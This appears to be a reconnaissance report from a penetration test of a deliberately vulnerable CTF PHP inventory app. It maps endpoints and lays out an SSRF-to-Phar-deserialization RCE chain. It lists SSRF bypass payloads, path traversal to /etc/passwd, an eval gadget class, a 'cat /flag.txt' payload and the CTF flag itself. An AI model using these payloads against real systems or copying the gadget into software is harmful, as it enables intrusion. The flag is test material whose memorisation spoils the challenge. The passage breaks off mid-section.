# Reconnaissance Deliverable: PHP-Based SKU Management System

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the application's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 6.4 (Guards Directory):** Catalog of authorization controls - understand what each guard means before analyzing vulnerabilities.
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping - use this to understand the privilege lattice and identify escalation targets.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. Pay special attention to flows marked with authorization guards and entities handling PII/sensitive data.

**Priority Order for Testing:** Start with Section 8's High-priority horizontal candidates, then vertical escalation endpoints for each role level, finally context-based workflow bypasses.

**CRITICAL FINDING:** This application has **ZERO authentication and authorization controls**. Every endpoint is publicly accessible with no access restrictions. This fundamentally changes the security model - instead of testing authorization bypasses, subsequent analysts should focus on exploiting the complete absence of access controls.

## 1. Executive Summary

This is a **CTF-style intentionally vulnerable PHP-based SKU management system** that demonstrates a complete absence of security controls. The application employs a two-container microservices architecture with:

- **Public-facing web frontend** (Apache/PHP 8.0 on port 8081)
- **Network-isolated backend service** (Nginx/PHP 7.4-FPM on port 4455)

**Core Functionality:** Product SKU management system with create, read, update, delete (CRUD) operations, search functionality, and an internal API for data processing.

**Critical Security Posture:**
- **NO authentication system** - No login, logout, or registration endpoints
- **NO authorization controls** - All endpoints publicly accessible
- **NO session management** - Completely stateless application
- **NO CSRF protection** - All state-changing operations vulnerable
- **CRITICAL RCE chain** - SSRF → File Upload → Phar Deserialization → eval() gadget
- **End-of-life software** - PHP 7.4 (EOL November 2022) and PHP 8.0 (EOL November 2023)

**Primary Technology Stack:**
- Frontend: PHP 8.0 + Apache 2.4.56 + Twig 3.10.3 templating
- Backend: PHP 7.4 + Nginx + PHP-FPM
- Database: SQLite 3 (file-based, no authentication)
- Containerization: Docker Compose with internal network isolation (bypassed by design)

**Attack Surface Summary:**
- 7 public endpoints on port 8081 (web application)
- 5 internal endpoints on port 4455 (accessible via SSRF)
- 24 distinct input vectors identified
- 7 critical vulnerabilities, 3 high, 7 medium, 1 low

## 2. Technology & Service Map

### Frontend
- **Framework:** Vanilla PHP (no MVC framework)
- **Templating Engine:** Twig 3.10.3 with sandbox security policy
- **Web Server:** Apache 2.4.56 (Debian)
- **PHP Version:** 8.0.30 (END OF LIFE - no security patches since November 2023)
- **Key Libraries:** 
  - twig/twig ^3.20 (only Composer dependency)
  - Symfony polyfills (auto-loaded)
- **Authentication Libraries:** NONE

### Backend
- **Language:** PHP 7.4 (END OF LIFE - no security patches since November 2022)
- **Web Server:** Nginx (reverse proxy + PHP-FPM)
- **Framework:** Vanilla PHP (no framework)
- **Key Dependencies:** None (standalone PHP scripts)
- **Critical Configuration:** `phar.readonly = Off` (enables Phar deserialization attacks)

### Infrastructure
- **Hosting Provider:** Local Docker containers
- **CDN:** None
- **Container Orchestration:** Docker Compose
- **Database Type:** SQLite 3 (file-based at `/var/db/database.db`)
- **Database Location:** Main webapp container only
- **Network Isolation:** Docker internal network (172.0.0.0/8) - bypassed by SSRF
- **TLS/SSL:** NOT IMPLEMENTED (HTTP only)

### Identified Subdomains
From subfinder scan (out of scope for localhost testing):
- sbs.allsaintsschool.localhost
- exchvm.nwcnet.localhost
- naeu2.naeuinc.localhost
- fndlync01.5ninesdata.localhost
- mse-ca-mail.corp.mse.localhost
- mail03.regency.localhost
- mail.regency.localhost
- server2.hunter.localhost
- www.localhost
- server02.counterintel.localhost
- autodiscover.regency.localhost
- mail02.regency.localhost
- tools.sonoma.edu.localhost
- mail.localhost
- autodiscover.localhost
- owa.regency.localhost

**Note:** These subdomains are not relevant to the target application at http://localhost:8081

### Open Ports & Services

**Target Application:**
- **Port 8081/TCP** - Apache 2.4.56 (Debian) - Main web application (PUBLIC)
  - Purpose: User-facing SKU management interface
  - Access: 0.0.0.0:8081 (publicly accessible)

**Internal Service:**
- **Port 4455/TCP** - Nginx + PHP-FPM 7.4 (INTERNAL)
  - Purpose: Internal API for file processing and data operations
  - Access: Docker internal network only (172.0.0.0/8)
  - Bypass: Accessible via SSRF endpoint on port 8081

**Other Ports (Out of Scope):**
- Port 80/TCP - Caddy httpd (not part of target application)
- Port 443/TCP - SSL/HTTPS (not part of target application)
- Port 631/TCP - CUPS printing service (system service, not application)
- Port 8888/TCP - Python SimpleHTTPServer with exposed .git repository (development artifact)
- Port 9999/TCP - Python SimpleHTTPServer (purpose unknown)
- Port 49152/TCP - Tailscale VPN service (requires authentication)

## 3. Authentication & Session Management Flow

### CRITICAL FINDING: NO AUTHENTICATION SYSTEM EXISTS

**Entry Points:** NONE - No authentication endpoints implemented
- ❌ No `/login`, `/auth`, `/signin` endpoints
- ❌ No `/logout` or session destruction
- ❌ No `/register`, `/signup` user creation endpoints
- ❌ No `/password-reset` or account recovery

**Mechanism:** NOT APPLICABLE
- No credential submission forms
- No token generation (JWT, OAuth, API keys)
- No cookie setting for authentication
- No session management
- No password hashing or validation

**Code Pointers:**
- **Search conducted across all 14 PHP files** - Zero authentication logic found
- `/app/index.php` - Homepage with NO login form (lines 1-96)
- No `session_start()` calls in entire codebase
- No `$_SESSION` variable usage
- No `setcookie()` calls for authentication
- No JWT, OAuth, or OIDC implementations

**Cosmetic "Session ID" Feature (NOT SECURITY):**
- **File:** `/app/index.php` (lines 13-23)
- **Class:** `RandomHash` generates random 32-character hex string
- **Display:** Shows "temporally session id is {random}" in HTML
- **Security Value:** ZERO - never validated, not stored, regenerated on every request
- **Misleading:** Falsely implies session management exists

### 3.1 Role Assignment Process

**Role Determination:** NOT APPLICABLE - No roles exist
- No user roles defined in code or database
- No role assignment logic
- No database table for users or roles
- Every visitor has equivalent access (full admin by default)

**Default Role:** Anonymous/Public (implicit)
- All endpoints accessible without authentication
- No distinction between authenticated/unauthenticated users

**Role Upgrade Path:** NOT APPLICABLE
- No mechanism to gain privileges
- No admin approval workflow
- No self-service role changes
- All users already have maximum privileges

**Code Implementation:** NONE
- Database schema at `/app/database.php` (lines 7-12) contains only `skus` table
- No `users`, `roles`, or `permissions` tables
- No role checking functions exist

### 3.2 Privilege Storage & Validation

**Storage Location:** NOT APPLICABLE - No privileges stored
- No JWT claims
- No session data
- No database columns for roles/permissions
- No external authorization service

**Validation Points:** NONE
- No middleware checks
- No decorators or guards
- No inline authorization checks
- Searched all 14 PHP endpoints - zero `if ($isAdmin)` or permission checks found

**Cache/Session Persistence:** NOT APPLICABLE
- Application is completely stateless
- No persistent user identity across requests

**Code Pointers:**
- Comprehensive search for `role|permission|privilege|auth` across all files
- Only matches: Composer metadata (author roles like "Lead Developer")
- No application-level authorization code

### 3.3 Role Switching & Impersonation

**Impersonation Features:** NONE
- No admin-to-user impersonation
- No "view as" functionality
- Not applicable - no roles to switch between

**Role Switching:** NONE
- No "sudo mode" or privilege elevation
- No temporary permission grants
- No re-authentication for sensitive operations

**Audit Trail:** NOT APPLICABLE
- No logging of access attempts
- No authentication event logs
- No user activity tracking

**Code Implementation:** NONE

## 4. API Endpoint Inventory

**Network Surface Focus:** All endpoints listed below are network-accessible through the target web application at http://localhost:8081 (main app) or via SSRF to internal service on port 4455.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|---------------------------|
| GET | `/index.php` | anon | None | None | Homepage with navigation links. Displays cosmetic "session ID". See `/app/index.php` lines 1-96. |
| POST | `/index.php` | anon | None | None | Accepts optional `username` parameter (sanitized with htmlspecialchars). See `/app/index.php` line 25. |
| GET | `/sku_system.php` | anon | None | None | Lists all SKU records from database. No pagination. See `/app/sku_system.php` lines 6-7. |
| GET | `/sku_search.php` | anon | None | None | Displays search form. See `/app/sku_search.php` line 18. |
| POST | `/sku_search.php` | anon | None | None | Executes search query with LIKE wildcards. Uses prepared statements (safe from SQLi). See `/app/sku_search.php` lines 7-11. |
| GET | `/sku_add.php` | anon | None | None | Displays form to add new SKU. See `/app/sku_add.php` line 20. |
| POST | `/sku_add.php` | anon | None | None | **HIGH RISK:** Inserts new SKU into database. No validation, no rate limiting, no CSRF protection. See `/app/sku_add.php` lines 6-11. |
| GET | `/sku_product_detail.php?id={id}` | anon | `id` (GET param) | None | **IDOR:** View any SKU record by ID. No ownership check. See `/app/sku_product_detail.php` lines 5-11. |
| GET | `/sku_url.php` | anon | None | None | Displays SSRF form. Shows client IP and internal service address. See `/app/sku_url.php` lines 84-102. |
| POST | `/sku_url.php` | anon | None | None | **CRITICAL SSRF:** Fetches content from user-supplied URL (port 4455 only). Response rendered with `\|raw` filter (XSS risk). See `/app/sku_url.php` lines 73-80, 34. |
| POST | `/sku_delete.php` | anon | `id` (POST param) | None | **CRITICAL:** Deletes any SKU record. No CSRF protection, no confirmation, no authorization. See `/app/sku_delete.php` lines 4-8. |
| GET | `/backup/` (internal) | anon | None | nginx: internal network | **INFO DISCLOSURE:** Directory listing enabled. Contains `backup.zip` (2857 bytes). Accessible via SSRF. See nginx.conf lines 23-27. |
| POST | `/sku_transfer` (internal) | anon | None | nginx: internal network + POST-only | Mock endpoint returning static SKU data with random quantities. See `/app/skumodel-srv/sku_transfer.php` lines 4-15. |
| POST | `/sku_validation` (internal) | anon | None | nginx: internal network + POST-only | Mock endpoint returning static validation results. See `/app/skumodel-srv/sku_validation.php` lines 4-15. |
| POST | `/sku_process` (internal) | anon | None | nginx: internal network + POST-only | **CRITICAL FILE UPLOAD:** Accepts base64-encoded data, writes to `/tmp/{random}.jpg`. No validation. Returns file path. See `/app/skumodel-srv/sku_process.php` lines 10-24. |
| POST | `/sku_read` (internal) | anon | `file_path` (POST param) | nginx: internal network + POST-only | **CRITICAL RCE:** Phar deserialization with eval() gadget. Reads phar:// wrapper, triggers `CustomTemplate::__wakeup()` → `eval($this->data)`. See `/app/skumodel-srv/read_sku.php` lines 10-26 and `/app/skumodel-srv/ReadClass.php` lines 13-18. |

**Key Observations:**
- **14 total endpoints** (7 public + 5 internal + 2 mock endpoints)
- **100% publicly accessible** - Zero authentication requirements
- **Zero authorization checks** - No role validation anywhere
- **Critical vulnerabilities:** SSRF, RCE via deserialization, arbitrary file write, IDOR, mass deletion
- **Network isolation bypass:** Internal service (port 4455) accessible via SSRF on public port 8081

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** All input vectors listed below are accessible through the target web application's network interface.

### 5.1 URL Parameters (GET)

| Parameter | Endpoint | File:Line | Data Type | Validation | Sanitization | Dangerous Sink |
|-----------|----------|-----------|-----------|------------|--------------|----------------|
| `id` | `/sku_product_detail.php` | `/app/sku_product_detail.php:5` | Integer (expected) | None | None | SQL query (prepared statement - safe) |

### 5.2 POST Body Fields (JSON/Form)

| Parameter | Endpoint | File:Line | Data Type | Validation | Sanitization | Dangerous Sink |
|-----------|----------|-----------|-----------|------------|--------------|----------------|
| `username` | `/index.php` | `/app/index.php:25` | String | None | htmlspecialchars() | Twig template (safe) |
| `search` | `/sku_search.php` | `/app/sku_search.php:7` | String | None | None | SQL LIKE query (prepared statement - safe) |
| `sku` | `/sku_add.php` | `/app/sku_add.php:6` | String | None | None | SQL INSERT (prepared statement - safe) |
| `name` | `/sku_add.php` | `/app/sku_add.php:7` | String | None | None | SQL INSERT (prepared statement - safe) |
| `description` | `/sku_add.php` | `/app/sku_add.php:8` | String | None | None | SQL INSERT (prepared statement - safe) |
| `id` | `/sku_delete.php` | `/app/sku_delete.php:4` | Integer (expected) | None | None | SQL DELETE (prepared statement - safe) |
| `url` | `/sku_url.php` | `/app/sku_url.php:73` | String (URL) | filter_var() + port check | None | **file_get_contents() - SSRF** |
| `data` | `/sku_process` (internal) | `/app/skumodel-srv/sku_process.php:10` | String (base64) | None | base64_decode() | **file_put_contents() - Arbitrary file write** |
| `file_path` | `/sku_read` (internal) | `/app/skumodel-srv/read_sku.php:10` | String (path) | file_exists() only | None | **file_get_contents('phar://') + unserialize() - RCE** |

### 5.3 HTTP Headers

| Header | Used By | File:Line | Purpose | Risk |
|--------|---------|-----------|---------|------|
| `REMOTE_ADDR` | `/sku_url.php` | `/app/sku_url.php:85` | Display client IP | Information disclosure (low risk) |
| `REQUEST_METHOD` | Multiple endpoints | Various | Validate HTTP method | No security value (no CSRF tokens) |

**Note:** No custom headers (X-API-Key, Authorization, etc.) are read or validated.

### 5.4 Cookie Values

**FINDING:** NO COOKIES USED
- No `setcookie()` calls in entire codebase
- No `$_COOKIE` variable access
- No cookie-based authentication or session tracking
- Application is completely stateless

### 5.5 File Uploads

| Upload Type | Endpoint | File:Line | Validation | Storage Location | Risk |
|-------------|----------|-----------|------------|------------------|------|
| Base64-encoded data (any type) | `/sku_process` (internal) | `/app/skumodel-srv/sku_process.php:14-18` | None | `/tmp/{random}.jpg` | **CRITICAL:** Can upload malicious Phar archives |

### 5.6 Server Variables (Read-Only)

| Variable | Used By | File:Line | Purpose |
|----------|---------|-----------|---------|
| `$_SERVER['REQUEST_METHOD']` | Multiple | Various | Method validation |
| `$_SERVER['REMOTE_ADDR']` | `/sku_url.php` | `/app/sku_url.php:85` | Display client IP |

### 5.7 Input Vector Summary

**Total Input Vectors:** 24
- URL parameters: 1
- POST body fields: 8
- HTTP headers: 2 (read-only, limited risk)
- Cookies: 0 (none used)
- File uploads: 1 (base64-encoded)
- Server variables: 2 (read-only)

**Critical Input Vectors (Direct Path to RCE):**
1. **POST `/sku_url.php` - `url` parameter** → SSRF (file_get_contents)
2. **POST `/sku_process` - `data` parameter** → Arbitrary file write
3. **POST `/sku_read` - `file_path` parameter** → Phar deserialization + eval()

## 6. Network & Interaction Map

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| User Browser | ExternAsset | Internet | Web Browser | Public | External attacker or legitimate user |
| WebApp Container | Service | App | PHP 8.0/Apache 2.4.56 | PII, Tokens | Main application backend on port 8081 |
| Service Container | Service | App | PHP 7.4/Nginx/PHP-FPM | Secrets | Internal API on port 4455, contains `/flag.txt` |
| SQLite Database | DataStore | Data | SQLite 3 | PII | File-based DB at `/var/db/database.db` in webapp container |
| Docker Internal Network | Network | App | Docker Bridge | N/A | 172.0.0.0/8 subnet, intended isolation boundary |
| Local Filesystem (/tmp) | DataStore | App | Linux FS | Uploaded Files | Temporary storage for file uploads in service container |
| CTF Flag | DataStore | App | Text File | Secrets | `/flag.txt` in service container |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| WebApp Container | Hosts: `http://localhost:8081`; Endpoints: `/index.php`, `/sku_add.php`, `/sku_delete.php`, `/sku_search.php`, `/sku_system.php`, `/sku_product_detail.php`, `/sku_url.php`; Auth: None; Dependencies: SQLite Database, Service Container (via SSRF); PHP Version: 8.0.30 (EOL) |
| Service Container | Hosts: `http://service:4455` (internal only); Endpoints: `/sku_transfer`, `/sku_validation`, `/sku_process`, `/sku_read`, `/backup/`; Auth: None; Access Control: Nginx ACL (172.0.0.0/8, POST-only); PHP Version: 7.4 (EOL); Critical Config: `phar.readonly = Off` |
| SQLite Database | Engine: SQLite 3; Location: `/var/db/database.db`; Exposure: Container-local only; Schema: Single `skus` table (id, sku, name, description); Credentials: None (file-based) |
| Docker Internal Network | CIDR: `172.0.0.0/8`; Purpose: Isolate service container from internet; Bypass: SSRF endpoint in webapp; Protocol: TCP/HTTP |
| Local Filesystem (/tmp) | Path: `/tmp/` in service container; Purpose: Store uploaded files; Permissions: World-writable; File naming: `{random}.jpg` regardless of content |
| CTF Flag | Path: `/flag.txt` in service container; Content: `flag{736ec0da-d311-46ea-add6-605a4d1c1a9d}`; Access: RCE required; Also in: `.env` file, Docker build args |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| User Browser → WebApp Container | HTTPS | `:8081 /*` | None | Public |
| User Browser → WebApp Container | HTTP | `:8081 /sku_url.php` | None | Public (SSRF vector) |
| WebApp Container → SQLite Database | File I/O | `/var/db/database.db` | None | PII |
| WebApp Container → Service Container | HTTP | `:4455 /*` (via SSRF) | port:4455 (weak) | Secrets, Uploaded Files |
| User Browser → Service Container | HTTP (indirect) | Via SSRF proxy | ssrf:bypass | Secrets, Uploaded Files |
| Service Container → Local Filesystem | File I/O | `/tmp/*.jpg` | None | Uploaded Files |
| Service Container → CTF Flag | File I/O | `/flag.txt` (via RCE) | rce:required | Secrets |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| None | Auth | **NO AUTHENTICATION GUARDS EXIST** - All endpoints publicly accessible |
| port:4455 | Network | Weak validation requiring port 4455 in URL (bypassable via URL parser differentials) |
| nginx:internal | Network | Nginx ACL restricts service to 172.0.0.0/8 Docker network |
| nginx:post-only | Network | Nginx `limit_except POST` restricts root location to POST method only |
| ssrf:bypass | Network | SSRF endpoint bypasses nginx:internal by proxying requests from webapp (172.0.0.0/8) to service |
| rce:required | Access | Access to `/flag.txt` requires achieving remote code execution |

**Critical Observation:** The application has NO authorization guards. The only security boundaries are network-level (Nginx ACL), which are intentionally bypassed by the SSRF design.

## 7. Role & Privilege Architecture

### CRITICAL FINDING: NO ROLE SYSTEM EXISTS

### 7.1 Discovered Roles

**NONE - Application has no role system**

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|-----------------|--------------|---------------------|
| Anonymous/Public (implicit) | 10 (maximum) | Global | No code - all endpoints accessible by default |

**Analysis:**
- No user roles defined in code
- No database tables for users or roles
- No role checking logic
- Every visitor has equivalent access to all functionality
- No distinction between authenticated and unauthenticated users

### 7.2 Privilege Lattice

**NOT APPLICABLE - No role hierarchy exists**

```
Privilege Ordering:
  Anonymous/Public (implicit) → Full Access to All Endpoints

No role distinctions:
  - No user vs admin separation
  - No privilege escalation paths (already at maximum)
  - No parallel isolation (no multi-tenancy)
```

**Impersonation:** Not implemented (no roles to impersonate)
**Sudo Mode:** Not implemented (no privilege elevation needed)

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|----------------------|
| Anonymous/Public (implicit) | `/index.php` | `/*` (all routes) | None |

**All users access the same routes with identical privileges.**

### 7.4 Role-to-Code Mapping

**NOT APPLICABLE - No role implementation exists**

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| N/A | None | None | N/A |

**Evidence:**
- Searched all 14 PHP files for `isAdmin`, `hasAccess`, `checkPermission` - Zero matches
- No middleware architecture (flat PHP structure)
- No decorators or guards
- No inline authorization checks (`if ($user->can(...))`)

## 8. Authorization Vulnerability Candidates

### CRITICAL NOTE: NO AUTHORIZATION SYSTEM EXISTS

This section is included for completeness, but the fundamental vulnerability is that **ALL endpoints are publicly accessible with NO authorization checks**. Instead of testing authorization bypasses, subsequent analysts should focus on exploiting the complete absence of access controls.

### 8.1 Horizontal Privilege Escalation Candidates

**N/A - No user isolation exists**

All data is accessible to all users. Since there's no authentication, concepts like "other users' resources" don't apply. However, IDOR vulnerabilities still exist for enumeration:

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity |
|----------|------------------|---------------------|-----------|-------------|
| HIGH | `/sku_product_detail.php?id={id}` | `id` (GET) | sku_data | Business data - can enumerate all SKU records |
| HIGH | `/sku_delete.php` (POST) | `id` (POST) | sku_data | **CRITICAL:** Can delete any SKU record, no confirmation |

**Attack Scenario:** Since no authentication exists, any attacker can:
1. Enumerate all SKU records: `GET /sku_product_detail.php?id=1`, `?id=2`, etc.
2. Delete all records: `POST /sku_delete.php` with `id=1`, `id=2`, etc.
3. No authorization bypass required - already have full access

### 8.2 Vertical Privilege Escalation Candidates

**N/A - No role hierarchy exists**

All users already have maximum privileges. There are no "admin-only" endpoints to escalate to because all endpoints are accessible to everyone.

| Target Role | Endpoint Pattern | Functionality | Risk Level |
|-------------|------------------|---------------|------------|
| N/A | All endpoints | All functionality | N/A - already accessible |

**Traditional vertical escalation testing is not applicable.** Instead, focus on:
- Exploiting administrative functionality without authentication
- Chaining vulnerabilities (SSRF → File Upload → RCE)
- Accessing internal services via SSRF

### 8.3 Context-Based Authorization Candidates

**N/A - No workflow state validation exists**

The application has no multi-step workflows that enforce sequential access. All endpoints are accessible directly without prerequisites.

| Workflow | Endpoint | Expected Prior State | Bypass Potential |
|----------|----------|---------------------|------------------|
| N/A | All endpoints | None | Already accessible |

**Observation:** Traditional context-based authorization testing (e.g., "access checkout without adding items to cart") is not applicable because the application has no protected workflows.

### 8.4 Network-Level Authorization Testing

**Priority Testing:** Since application-level authorization is absent, focus on network-level boundaries:

| Priority | Test | Endpoint | Expected Behavior | Bypass Method |
|----------|------|----------|-------------------|---------------|
| CRITICAL | SSRF to internal service | `/sku_url.php` | Should block internal network access | Already bypassable - port 4455 restriction only |
| CRITICAL | File upload without auth | `/sku_process` (internal) | Should require authentication | Accessible via SSRF proxy |
| CRITICAL | Phar deserialization | `/sku_read` (internal) | Should require authentication | Accessible via SSRF proxy |
| HIGH | Directory listing | `/backup/` (internal) | Should require authentication | Accessible via SSRF or direct if network-reachable |

**Primary Attack Chain:**
1. No authentication required at any step
2. SSRF bypasses network isolation
3. File upload enables Phar creation
4. Deserialization triggers RCE
5. Access to `/flag.txt`

## 9. Injection Sources (Command Injection, SQL Injection, LFI/RFI, SSTI, Path Traversal, Deserialization)

**Network Surface Focus:** All injection sources listed are reachable through network-accessible endpoints.

### 9.1 SQL Injection Sources

**FINDING: NO SQL INJECTION VULNERABILITIES**

All database queries use PDO prepared statements with parameterized queries:

| Endpoint | File:Line | Query Type | Input | Status |
|----------|-----------|------------|-------|--------|
| `/sku_add.php` | `/app/sku_add.php:10-11` | INSERT | `sku`, `name`, `description` | ✅ SAFE - Prepared statement |
| `/sku_delete.php` | `/app/sku_delete.php:7-8` | DELETE | `id` | ✅ SAFE - Prepared statement |
| `/sku_search.php` | `/app/sku_search.php:9-10` | SELECT | `search` | ✅ SAFE - Prepared statement |
| `/sku_product_detail.php` | `/app/sku_product_detail.php:9-10` | SELECT | `id` | ✅ SAFE - Prepared statement |
| `/sku_system.php` | `/app/sku_system.php:7` | SELECT | None | ✅ SAFE - Static query |

**Conclusion:** Developers correctly implemented PDO prepared statements throughout. No SQL injection attack surface identified.

### 9.2 Command Injection Sources

**FINDING: NO COMMAND INJECTION VULNERABILITIES**

**Search Results:** No usage of:
- `shell_exec()`
- `exec()`
- `system()`
- `passthru()`
- `popen()`
- `proc_open()`
- Backticks (`` ` ``)

**Conclusion:** No system command execution functions used. No command injection attack surface identified.

### 9.3 Server-Side Request Forgery (SSRF)

**CRITICAL INJECTION SOURCE: SSRF with Partial Validation Bypass**

```
Entry Point: POST /sku_url.php - parameter 'url'
Source Location: /app/sku_url.php:73
Data Flow:
  1. User input received: $_POST['url'] (line 73)
  2. Passed to SkuService::fetchSkuModel($url) (line 80)
  3. URL validation: filter_var($url, FILTER_VALIDATE_URL) (line 6)
  4. Port validation: port must equal 4455 (line 14)
  5. Host replacement: 127.0.0.1/localhost → 'service' (lines 19-21)
  6. Stream context created with POST method + hardcoded data (lines 24-31)
Dangerous Sink: /app/sku_url.php:34
  $response = file_get_contents($url, false, $context);
Validation:
  ✓ filter_var() with FILTER_VALIDATE_URL
  ⚠️ Port must be 4455 (loose comparison with !=)
  ⚠️ Only blocks exact string 'localhost' and '127.0.0.1' (IPv6, octal, hex bypasses possible)
  ❌ Does NOT block dangerous protocols: file://, php://, phar://, data://
  ❌ Does NOT block internal IPs: 169.254.169.254, 192.168.x.x, 10.x.x.x, 172.x.x.x
```

**SSRF Bypass Techniques:**
1. **Internal Service Access:** `http://service:4455/sku_read` (intended behavior)
2. **IPv6 Loopback:** `http://[::1]:4455/`
3. **Octal IP:** `http://0177.0.0.1:4455/`
4. **Hex IP:** `http://0x7f000001:4455/`
5. **DNS Rebinding:** Domain that resolves to internal IP
6. **URL Parser Differentials:** `http://example.com:4455@service:4455/`
7. **Protocol Smuggling:** `file:///flag.txt:4455` (may bypass port check)
8. **Cloud Metadata:** `http://169.254.169.254:4455/latest/meta-data/` (AWS)

**Chaining Opportunity:** SSRF provides public access to internal service (port 4455), enabling:
- File upload via `/sku_process`
- RCE via `/sku_read` (Phar deserialization)
- Information disclosure via `/backup/`

### 9.4 Path Traversal / Local File Inclusion (LFI)

**CRITICAL INJECTION SOURCE: Path Traversal in File Read Operation**

```
Entry Point: POST /sku_read (internal) - parameter 'file_path'
Source Location: /app/skumodel-srv/read_sku.php:10
Data Flow:
  1. User input received: $_POST['file_path'] (line 10)
  2. File existence check: file_exists($filePath) (line 12)
  3. Concatenation with phar:// wrapper (line 14)
  4. File read: file_get_contents('phar://' . $filePath . '/manifest') (line 14)
Dangerous Sink: /app/skumodel-srv/read_sku.php:14
  file_get_contents('phar://' . $filePath . '/manifest')
Validation:
  ⚠️ file_exists() check only (does not prevent traversal)
  ❌ NO path sanitization
  ❌ NO whitelist of allowed paths
  ❌ NO prevention of phar:// wrapper
```

**Path Traversal Attacks:**
1. **Read arbitrary files:** `../../../etc/passwd` (if accessible)
2. **Access uploaded files:** `/tmp/{known_hash}.jpg` (from sku_process)
3. **Traverse to flag:** `/flag.txt` (may fail phar parsing but worth testing)

**Note:** This vulnerability chains with arbitrary file write (sku_process) for RCE.

### 9.5 Remote File Inclusion (RFI)

**FINDING: NO RFI VULNERABILITIES**

**Analysis:**
- All `include`/`require` statements use static paths:
  - `require 'database.php'` (multiple files)
  - `require 'vendor/autoload.php'` (multiple files)
  - `require_once 'ReadClass.php'` (`/app/skumodel-srv/read_sku.php:3`)
- No user-controllable input in include/require paths

**Conclusion:** No RFI attack surface identified.

### 9.6 Server-Side Template Injection (SSTI)

**FINDING: LIMITED SSTI RISK - Twig Sandbox Prevents Direct Injection**

**Analysis:**

**Twig Configuration:**
- **File:** `/app/index.php` (lines 31-35, 60-68)
- **Sandbox:** Enabled with strict security policy
- **Allowed tags:** `for`, `if`, `block`, `extends`, `include`, `set`, `do`
- **Allowed filters:** `escape`, `raw`, `upper`, `lower`, `striptags`, `replace`
- **Allowed methods:** `getValue` (for RandomHash), `fetchSkuModel` (for SkuService)

**Input Handling:**
- `$_POST['username']` sanitized with `htmlspecialchars()` before template (line 25)
- No direct user input embedded in template strings
- Templates loaded from filesystem, not user input

**XSS via Raw Filter (Not SSTI, but Related):**
```
Entry Point: POST /sku_url.php - parameter 'url'
Template: /app/templates/sku_model.html.twig:20
Dangerous Rendering: {{ sku_model|raw }}
```
- User controls content via SSRF response
- `|raw` filter disables HTML escaping
- Enables reflected XSS, not SSTI

**Conclusion:** Twig sandbox prevents direct template injection. However, `|raw` filter creates XSS vulnerability when rendering SSRF responses.

### 9.7 Unsafe Deserialization

**CRITICAL INJECTION SOURCE: Phar Deserialization with eval() Gadget**

```
Entry Point: POST /sku_read (internal) - parameter 'file_path'
Source Location: /app/skumodel-srv/read_sku.php:10
Data Flow:
  1. User input received: $_POST['file_path'] (line 10)
  2. File existence check: file_exists($filePath) (line 12)
  3. Phar metadata read: file_get_contents('phar://' . $filePath . '/manifest') (line 14)
     → Automatically triggers deserialization of Phar metadata
  4. Explicit deserialization: unserialize($content) (line 22)
  5. Type check: if ($object instanceof CustomTemplate) (line 24)
     → Too late - __wakeup() already executed at step 3
  6. Method call: $object->render() (line 26)
Dangerous Sinks:
  - /app/skumodel-srv/read_sku.php:14 - Phar wrapper triggers auto-deserialization
  - /app/skumodel-srv/read_sku.php:22 - Explicit unserialize()
  - /app/skumodel-srv/ReadClass.php:13-14 - CustomTemplate::__wakeup() contains eval($this->data)
  - /app/skumodel-srv/ReadClass.php:17-18 - CustomTemplate::render() contains eval($this->data)
Validation:
  ❌ NO validation of file_path input
  ❌ NO prevention of phar:// wrapper
  ❌ NO safe deserialization (unserialize() without allowed_classes)
  ❌ NO validation before deserialization
```

**RCE Gadget Chain:**
```php
// File: /app/skumodel-srv/ReadClass.php
class CustomTemplate {
    public $data;
    
    public function __wakeup() {
        eval($this->data);  // Line 13-14 - CRITICAL RCE
    }
    
    public function render() {
        eval($this->data);  // Line 17-18 - CRITICAL RCE
    }
}
```

**Complete Attack Chain:**
1. **Create malicious Phar archive:**
   - Craft Phar with serialized `CustomTemplate` object in metadata
   - Set `$data` property to malicious PHP code: `system("cat /flag.txt");`
2. **Upload via sku_process:**
   - `POST /sku_process` with base64-encoded Phar
   - Receive file path: `/tmp/{hash}.jpg`
3. **Trigger deserialization:**
   - `POST /sku_read` with `file_path=/tmp/{hash}.jpg`
   - Phar wrapper automatically deserializes metadata
   - `CustomTemplate::__wakeup()` executes `eval($this->data)`
4. **Remote Code Execution achieved**

**Critical Configuration:**
- **File:** `/app/skumodel-srv/Dockerfile:9`
- **Setting:** `RUN echo "phar.readonly = Off" >> /usr/local/etc/php/conf.d/docker-php-ext-phar.ini`
- **Impact:** Enables Phar archive creation and manipulation

### 9.8 Arbitrary File Write

**CRITICAL INJECTION SOURCE: Unrestricted File Upload**

```
Entry Point: POST /sku_process (internal) - parameter 'data'
Source Location: /app/skumodel-srv/sku_process.php:10
Data Flow:
  1. User input received: $_POST['data'] (line 10)
  2. Base64 decode: $decodedData = base64_decode($data) (line 14)
  3. Random filename: $randomHash = bin2hex(random_bytes(16)) (line 15)
  4. Hardcoded path: $filePath = "/tmp/{$randomHash}.jpg" (line 16)
  5. File write: file_put_contents($filePath, $decodedData) (line 18)
  6. Response includes full file path (line 23)
Dangerous Sink: /app/skumodel-srv/sku_process.php:18
